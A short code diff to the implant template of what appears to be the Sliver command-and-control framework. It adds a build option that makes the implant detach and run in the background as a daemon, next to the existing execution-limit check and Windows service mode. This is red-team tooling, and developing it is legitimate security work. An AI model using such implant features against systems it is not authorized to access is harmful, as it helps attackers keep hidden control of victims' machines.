@@ -66,6 +66,9 @@ import (
 	// {{if .Config.IsService}}
 	"golang.org/x/sys/windows/svc"
 	// {{end}}
+	// {{if .Config.IsDaemon}}
+	"github.com/bishopfox/sliver/implant/sliver/daemon"
+	// {{end}}
 )
 
 var (
@@ -171,7 +174,6 @@ func DllUnregisterServer() { main() }
 // {{end}}
 
 func main() {
-
 	// {{if .Config.Debug}}
 	log.SetFlags(log.LstdFlags | log.Lshortfile)
 	// {{else}}
@@ -184,6 +186,10 @@ func main() {
 	// {{end}}
 
 	limits.ExecLimits() // Check to see if we should execute
+
+	// {{if .Config.IsDaemon}}
+	daemon.Daemonize()
+	// {{end}}
 
 	// {{if .Config.IsService}}
 	svc.Run("", &sliverService{})
